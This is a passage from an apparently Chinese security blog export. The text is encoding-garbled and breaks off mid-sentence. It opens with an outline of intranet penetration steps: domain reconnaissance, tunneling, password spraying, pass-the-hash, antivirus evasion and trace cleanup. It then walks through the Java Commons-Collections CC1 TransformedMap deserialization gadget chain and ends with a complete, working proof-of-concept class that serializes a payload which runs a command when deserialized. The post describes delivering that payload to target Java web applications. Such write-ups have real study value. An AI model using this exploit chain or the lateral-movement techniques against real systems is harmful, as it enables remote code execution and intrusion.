title="åˆ¤æ–­æ˜¯å¦å­˜åœ¨åŸŸ"></a>åˆ¤æ–­æ˜¯å¦å­˜åœ¨åŸŸ</h1><p>è·å¾—æœ¬æœºç›¸å…³ä¿¡æ¯ä¹‹åï¼Œå°±è¦åˆ¤æ–­å½“å‰å†…ç½‘ä¸­æ˜¯å¦å­˜åœ¨åŸŸã€‚å¦‚æœå½“å‰å†…ç½‘å­˜åœ¨åŸŸï¼Œåˆ™éœ€è¦åˆ¤æ–­æ‰€æ§ä¸»æœºæ˜¯å¦åœ¨åŸŸå†…ã€‚</p><h1 id="åŸŸå†…åŸºç¡€ä¿¡æ¯æ”¶é›†"><a href="#åŸŸå†…åŸºç¡€ä¿¡æ¯æ”¶é›†" class="headerlink" title="åŸŸå†…åŸºç¡€ä¿¡æ¯æ”¶é›†"></a>åŸŸå†…åŸºç¡€ä¿¡æ¯æ”¶é›†</h1><ul><li>ä¸»æœº</li><li>ç”¨æˆ·å’Œç”¨æˆ·ç»„</li><li>è®¡ç®—æœºåˆ—è¡¨</li><li>å¯†ç ç­–ç•¥</li><li>åŸŸæ§</li><li>åŸŸç®¡ç†å‘˜</li><li>åŸŸç®¡ç†è¿›ç¨‹</li><li>æ ¸å¿ƒä¸šåŠ¡æœºå™¨</li><li>æ•æ„Ÿæ–‡ä»¶</li><li>åŸŸå†…ç½‘æ®µåˆ’åˆ†æƒ…å†µåŠæ‹“æ‰‘ç»“æ„</li></ul><h1 id="æ„å»ºéš§é“"><a href="#æ„å»ºéš§é“" class="headerlink" title="æ„å»ºéš§é“"></a>æ„å»ºéš§é“</h1><ul><li>åˆ¤æ–­å†…ç½‘è¿é€šæ€§æ„å»ºç›¸åº”éš§é“</li><li>ç«¯å£è½¬å‘</li></ul><p><strong>éµå¾ªä¸‰ä¸ªåŸåˆ™</strong></p><ol><li><strong>ç¨³å®šæ€§</strong>ï¼ˆä¸»è¦ç”¨äºæ‰«æï¼‰{ æ”¯æŒé«˜å¹¶å‘ã€è‡ªåŠ¨æ–­çº¿é‡è¿ }</li><li><strong>å®‰å…¨æ€§</strong>ï¼ˆé˜²æ­¢socks5ç›´æ¥è¢«banï¼‰{ æµé‡å¯åŠ å¯†ã€å¼€æ”¾ä»£ç†å¯è®¾ç½®è®¤è¯ }</li><li><strong>å¥å£®æ€§</strong> { æ”¯æŒå¤šç§åè®®æ–¹å¼ã€æœ€å¥½æ”¯æŒæ’ä»¶å®šåˆ¶ }</li></ol><h1 id="æ¢æµ‹åŸŸå†…å­˜æ´»ä¸»æœº"><a href="#æ¢æµ‹åŸŸå†…å­˜æ´»ä¸»æœº" class="headerlink" title="æ¢æµ‹åŸŸå†…å­˜æ´»ä¸»æœº"></a>æ¢æµ‹åŸŸå†…å­˜æ´»ä¸»æœº</h1><p>åœ¨è¿›è¡ŒåŸŸå†…å­˜æ´»ä¸»æœºæ¢æµ‹çš„æ—¶å€™ï¼Œæœ‰å‡ ä¸ªæ³¨æ„ç‚¹ï¼š</p><ul><li>å°½é‡é¿å…è§¦å‘åŸŸå†…çš„ä¸€äº›é˜²ç—…æ¯’è½¯ä»¶çš„å‘Šè­¦å’Œæ‹¦æˆªï¼›</li><li>åœ¨éæˆæƒæƒ…å†µä¸‹ï¼Œé¿å…ä½¿ç”¨å·¥å…·è¿›è¡Œæš´åŠ›æ‰«æï¼›</li><li>å°½é‡é¿å…åœ¨ç›®æ ‡æœºå­ä¸Šä½¿ç”¨å›¾å½¢åŒ–å·¥å…·ï¼›</li><li>å°½é‡ä½¿ç”¨ç³»ç»Ÿè‡ªå¸¦çš„å·¥å…·è¿›è¡Œæ¢æµ‹ï¼Œå¦‚powershellè„šæœ¬ï¼›</li></ul><h1 id="åŸŸå†…å­˜æ´»ä¸»æœºç«¯å£æ‰«æ"><a href="#åŸŸå†…å­˜æ´»ä¸»æœºç«¯å£æ‰«æ" class="headerlink" title="åŸŸå†…å­˜æ´»ä¸»æœºç«¯å£æ‰«æ"></a>åŸŸå†…å­˜æ´»ä¸»æœºç«¯å£æ‰«æ</h1><p>ä¸€èˆ¬ç«¯å£æ‰«æéœ€è¦å…³æ³¨å¦‚ä¸‹ä¸‰ç‚¹ï¼š</p><ul><li>ç«¯å£çš„Bannerä¿¡æ¯ï¼›</li><li>ç«¯å£ä¸Šè¿è¡Œçš„æœåŠ¡ï¼›</li><li>å¸¸è§æœåŠ¡çš„é»˜è®¤ç«¯å£å·ï¼›</li></ul><h1 id="æ¨ªå‘ç§»åŠ¨"><a href="#æ¨ªå‘ç§»åŠ¨" class="headerlink" title="æ¨ªå‘ç§»åŠ¨"></a>æ¨ªå‘ç§»åŠ¨</h1><ul><li>å„ç§æ”¶é›†åˆ°çš„å‡­è¯</li><li>å¼±å£ä»¤ï¼Œå¯†ç å–·æ´’</li><li>å¸¸è§Webï¼Œä¸»æœºæ¼æ´</li><li>hashä¼ é€’æ”»å‡»</li></ul><h1 id="è¾…åŠ©"><a href="#è¾…åŠ©" class="headerlink" title="è¾…åŠ©"></a>è¾…åŠ©</h1><ul><li>å…æ€</li><li>æƒé™æå‡</li><li>æƒé™ç»´æŒ</li><li>ç—•è¿¹æ¸…ç†</li></ul>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Javaååºåˆ—åŒ–ä¹‹CC1-TransFormed</title>
      <link href="/2023/05/01/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCC1-TransFormed/"/>
      <url>/2023/05/01/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCC1-TransFormed/</url>
      
        <content type="html"><![CDATA[<h2 id="CC1-TransFormed-chains"><a href="#CC1-TransFormed-chains" class="headerlink" title="CC1-TransFormed chains"></a>CC1-TransFormed chains</h2><h3 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h3><p>java&lt;8u71</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="å¤ç°"><a href="#å¤ç°" class="headerlink" title="å¤ç°"></a>å¤ç°</h3><p><strong>Demo</strong></p><p><img src="/../images/image-20230923145638448.png" alt="image-20230923145638448"></p><p>å…³é”®ç‚¹</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># èƒ½å¤Ÿä»»æ„å‘½ä»¤æ‰§è¡Œçš„ç‚¹</span></span><br><span class="line">InvokerTransformeræ˜¯å®ç°äº†Transformeræ¥â¼çš„â¼€ä¸ªç±»ï¼Œè¿™ä¸ªç±»ä½¿ç”¨äº†åå°„ï¼Œå¹¶ä¸”åå°„çš„å‚æ•°å¯æ§ï¼Œå¯ä»¥â½¤æ¥æ‰§â¾ä»»æ„â½…æ³•ã€‚</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230923155216854.png" alt="image-20230923155216854"></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æ‰‹åŠ¨è°ƒç”¨InvokerTransformerçš„transfromæ–¹æ³•æ¥æ‰§è¡Œå‘½ä»¤</span></span><br><span class="line">Runtime runtime = Runtime.getRuntime();</span><br><span class="line">new InvokerTransformer(<span class="string">&quot;exec&quot;</span>,new Class[]&#123;String.class&#125;,new Object[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(runtime);</span><br></pre></td></tr></table></figure><p>Demoä»£ç è§£é‡Š</p><ul><li><p>æ„é€ å›è°ƒé“¾</p><p><img src="/../images/image-20230923195149097.png" alt="image-20230923195149097"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//ç›´æ¥è¿”å›å½“å‰ç¯å¢ƒçš„Runtimeå¯¹è±¡</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.getRuntime()),</span><br><span class="line"></span><br><span class="line">                <span class="comment">//ç¬¬â¼€ä¸ªå‚æ•°æ˜¯å¾…æ‰§â¾çš„â½…æ³•åï¼ˆå“ªä¸ªç±»çš„æ–¹æ³•åï¼Ÿå‰ä¸€ä¸ªå›è°ƒå‡½æ•°è¿”å›çš„ç»“æœå³ConstantTransformerè¿”å›çš„å¯¹è±¡ï¼‰</span></span><br><span class="line">                <span class="comment">//ç¬¬â¼†ä¸ªå‚æ•°æ˜¯è¿™ä¸ªå‡½æ•°çš„å‚æ•°åˆ—è¡¨çš„å‚æ•°ç±»å‹</span></span><br><span class="line">                <span class="comment">//ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯ä¼ ç»™è¿™ä¸ªå‡½æ•°çš„å‚æ•°åˆ—è¡¨</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;</span><br><span class="line">                        ),</span><br><span class="line">        &#125;;</span><br><span class="line"><span class="comment">//å°†å†…éƒ¨çš„å¤šä¸ªTransformerä¸²åœ¨â¼€èµ·ï¼Œå‰â¼€ä¸ªå›è°ƒè¿”å›çš„ç»“æœï¼Œä½œä¸ºåâ¼€ä¸ªå›è°ƒçš„å‚æ•°ä¼ â¼Š</span></span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure></li><li><p>ä¿®é¥°Map</p><blockquote><p>TransformedMapâ½¤äºå¯¹Javaæ ‡å‡†æ•°æ®ç»“æ„Mapåšâ¼€ä¸ªä¿®é¥°ï¼Œè¢«ä¿®é¥°è¿‡çš„Map<strong>åœ¨æ·»åŠ æ–°çš„å…ƒç´ æ—¶ï¼Œå°†å¯ä»¥æ‰§â¾â¼€ä¸ªå›è°ƒ</strong>ã€‚</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//ä¿®é¥°Map</span></span><br><span class="line"><span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(</span><br><span class="line">    innerMap,</span><br><span class="line">    <span class="literal">null</span>,</span><br><span class="line">    transformerChain</span><br><span class="line">);</span><br></pre></td></tr></table></figure></li><li><p>è§¦å‘å›è°ƒæœ€åæ‰§è¡ŒRuntimeå¯¹è±¡çš„execæ–¹æ³•</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//è§¦å‘å›è°ƒ</span></span><br><span class="line">outerMap.put(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);     </span><br></pre></td></tr></table></figure></li></ul><p><strong>POC</strong></p><p>é€šè¿‡ä¸Šé¢çš„Demoæˆ‘ä»¬å¯çŸ¥é“¾å­çš„å°¾å·´åœ¨<code>InvokerTransformer</code>çš„<code>transfrom</code>æ–¹æ³•,å¾€å›æ‰¾</p><p><img src="/../images/db55d9439c95d5cda0646b0be1180bfa.png" alt="image-20220114111551082"></p><p><img src="/../images/image-20230923165556436.png" alt="image-20230923165556436"></p><p>æŸ¥çœ‹ TranformedMap çš„æ„é€ æ–¹æ³•ï¼Œå› ä¸ºæ˜¯ protected å±æ€§æ— æ³•è°ƒç”¨ï¼Œå¯»æ‰¾åˆ°ä¸€ä¸ªé™æ€æ–¹æ³•è°ƒç”¨äº†æ„é€ æ–¹æ³•</p><p><img src="/../images/98896b69dec504c41a332c33936d02ef.png" alt="image-20220114130017028"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line"></span><br><span class="line">HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"><span class="comment">//ä½¿ç”¨é™æ€æ–¹æ³•decorateæ¥è°ƒç”¨æ„é€ å‡½æ•°</span></span><br><span class="line">TransformedMap.decorate(map, <span class="literal">null</span>, invokerTransformer);</span><br></pre></td></tr></table></figure><p>æ‰¾è°è°ƒç”¨äº†<code>checkSetValue</code></p><p><img src="/../images/image-20230923170844418.png" alt="image-20230923170844418"></p><p><code>MapEntry</code>çš„<code>setValue</code>æ˜¯ç”¨äºéå†HashMapçš„ã€‚æ‰€ä»¥åªéœ€è¦éå†ä¸€ä¸ªMapå°±å¯ä»¥è§¦å‘è¿™ä¸ª<code>setValue</code>æ–¹æ³•ã€‚</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">map.put(<span class="string">&quot;test&quot;</span>,<span class="string">&quot;123&quot;</span>);</span><br><span class="line">Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map, <span class="literal">null</span>, invokerTransformer);</span><br><span class="line"><span class="keyword">for</span> (Map.Entry entry: transformedMap.entrySet()) &#123;</span><br><span class="line"><span class="comment">// è°ƒç”¨ SetValueï¼ŒSetValue ä¸­è°ƒç”¨äº† checkSetValueï¼ŒcheckSetValue è°ƒç”¨äº† transform</span></span><br><span class="line">entry.setValue(runtime);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç»§ç»­æ‰¾è°è°ƒç”¨äº†<code>setValue</code>ï¼Œè¿™é‡Œåˆšå¥½æœ‰ä¸€ä¸ªåœ¨<code>readObject</code>é‡Œè°ƒç”¨äº†<code>setValue</code>çš„</p><p><img src="/../images/image-20230923173037421.png" alt="image-20230923173037421"></p><p><img src="/../images/image-20230923173551302.png" alt="image-20230923173551302"></p><p><img src="/../images/image-20230923173506439.png" alt="image-20230923173506439"></p><p>å¹¶ä¸”ä»è¯¥ç±»çš„æ„é€ å‡½æ•°å¯ä»¥çŸ¥é“<code>memberValues</code>æ˜¯å¯æ§çš„</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;test&quot;</span>,<span class="string">&quot;123&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map, <span class="literal">null</span>, invokerTransformer);</span><br><span class="line"><span class="comment">//        for (Map.Entry entry: transformedMap.entrySet()) &#123;</span></span><br><span class="line"><span class="comment">//            // è°ƒç”¨ SetValueï¼ŒSetValue ä¸­è°ƒç”¨äº† checkSetValueï¼ŒcheckSetValue è°ƒç”¨äº† transform</span></span><br><span class="line"><span class="comment">//            entry.setValue(runtime);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">//ç±»æ²¡æœ‰æ³¨æ˜ç±»å‹ï¼Œé»˜è®¤ä¸º defaultï¼Œå³åªèƒ½åœ¨æœ¬åŒ…å†…ä½¿ç”¨ï¼Œæ‰€ä»¥éœ€è¦ç”¨åå°„è°ƒç”¨æ‰§è¡Œ</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationInvocationdhlConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        annotationInvocationdhlConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationInvocationdhlConstructor.newInstance(Override.class, transformedMap);</span><br></pre></td></tr></table></figure><p>ç°åœ¨æœ‰ä¸¤ä¸ªé—®é¢˜</p><ol><li><p>Runtime ç±»ä¸å¯ä»¥è¢«åºåˆ—åŒ–ï¼Œæ²¡æœ‰ç»§æ‰¿ serializable æ¥å£ï¼Œåå°„è·å–å¹¶è½¬æ¢ä¸ºTransformerå†™æ³•</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//é¦–å…ˆéœ€è¦è·å¾—Runtimeç±»çš„Classå®ä¾‹</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">clz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="comment">//è·å¾—Runtimeç±»çš„getRuntimeæ–¹æ³•</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">getruntime</span> <span class="operator">=</span> clz.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//è°ƒç”¨è¯¥æ–¹æ³•è·å¾—Runtimeå¯¹è±¡</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">runtime</span> <span class="operator">=</span> getruntime.invoke(clz);</span><br><span class="line"><span class="comment">//è·å¾—Runtimeç±»çš„execæ–¹æ³•</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">exec</span> <span class="operator">=</span> clz.getMethod(<span class="string">&quot;exec&quot;</span>,String.class);</span><br><span class="line"><span class="comment">//è°ƒç”¨execæ–¹æ³•æ‰§è¡Œå‘½ä»¤</span></span><br><span class="line">exec.invoke(runtime,<span class="string">&quot;calc&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure></li><li><p>ifæ¡ä»¶</p><blockquote><p>è¿™éƒ¨åˆ†æ˜¯æ³¨è§£çš„çŸ¥è¯†</p></blockquote><p><img src="/../images/image-20230923190120874.png" alt="image-20230923190120874"></p><blockquote><ol><li><p>sun.reflect.annotation.AnnotationInvocationHandler æ„é€ å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°å¿…é¡»æ˜¯ Annotationçš„å­ç±»ï¼Œä¸”å…¶ä¸­å¿…é¡»å«æœ‰è‡³å°‘ä¸€ä¸ªæ–¹æ³•,æ–¹æ³•åä¸ºvalue</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationInvocationdhlConstructor.newInstance(Target.class, transformedMap);</span><br></pre></td></tr></table></figure></li><li><p>è¢« TransformedMap.decorate ä¿®é¥°çš„Mapä¸­å¿…é¡»æœ‰ä¸€ä¸ªé”®åä¸ºvalueçš„å…ƒç´ </p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;xxx&quot;</span>);</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230923190034704.png" alt="image-20230923190034704"></p></li></ol></blockquote></li><li><p>ç±»ä¸å¯æ§</p><p><img src="/../images/image-20230923190148131.png" alt="image-20230923190148131"></p><p>éœ€è¦æ§åˆ¶setvalueçš„å‚æ•°ä¸ºRuntimeå¯¹è±¡</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class) <span class="comment">//è¾“å…¥å•¥å¯¹è±¡è¿”å›å•¥å¯¹è±¡</span></span><br></pre></td></tr></table></figure></li></ol><p><strong>æœ€ç»ˆpayload</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonCollections1POC</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;123&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map, <span class="literal">null</span>, transformerChain);</span><br><span class="line">        </span><br><span class="line"><span class="comment">//        æ‰‹åŠ¨è§¦å‘setvalue</span></span><br><span class="line"><span class="comment">//        for (Map.Entry entry: transformedMap.entrySet()) &#123;</span></span><br><span class="line"><span class="comment">//            // è°ƒç”¨ SetValueï¼ŒSetValue ä¸­è°ƒç”¨äº† checkSetValueï¼ŒcheckSetValue è°ƒç”¨äº† transform</span></span><br><span class="line"><span class="comment">//            entry.setValue(runtime);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//ç±»æ²¡æœ‰æ³¨æ˜ç±»å‹ï¼Œé»˜è®¤ä¸º defaultï¼Œå³åªèƒ½åœ¨æœ¬åŒ…å†…ä½¿ç”¨ï¼Œæ‰€ä»¥éœ€è¦ç”¨åå°„è°ƒç”¨æ‰§è¡Œ</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationInvocationdhlConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        annotationInvocationdhlConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// Target æ³¨è§£ç±»å‹</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationInvocationdhlConstructor.newInstance(Target.class, transformedMap);</span><br><span class="line"></span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230923191819061.png" alt="image-20230923191819061"></p><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">æˆ‘ä»¬æ„é€ æ¶æ„çš„AnnotationInvocationHandlerç±»ï¼Œå°†è¯¥ç±»çš„æˆå‘˜å˜é‡memberValuesèµ‹å€¼ä¸ºæˆ‘ä»¬ç²¾å¿ƒæ„é€ çš„TransformedMapå¯¹è±¡ï¼Œå¹¶å°†AnnotationInvocationHandlerç±»è¿›è¡Œåºåˆ—åŒ–ï¼Œç„¶åäº¤ç»™ç›®æ ‡JAVA WEBåº”ç”¨è¿›è¡Œååºåˆ—åŒ–ã€‚åœ¨è¿›è¡Œååºåˆ—åŒ–æ—¶ï¼Œä¼šæ‰§è¡ŒreadObject()æ–¹æ³•ï¼Œè¯¥æ–¹æ³•ä¼šå¯¹æˆå‘˜å˜é‡TransformedMapçš„Valueå€¼è¿›è¡Œä¿®æ”¹ï¼Œè¯¥ä¿®æ”¹è§¦å‘äº†TransformedMapå®ä¾‹åŒ–æ—¶ä¼ 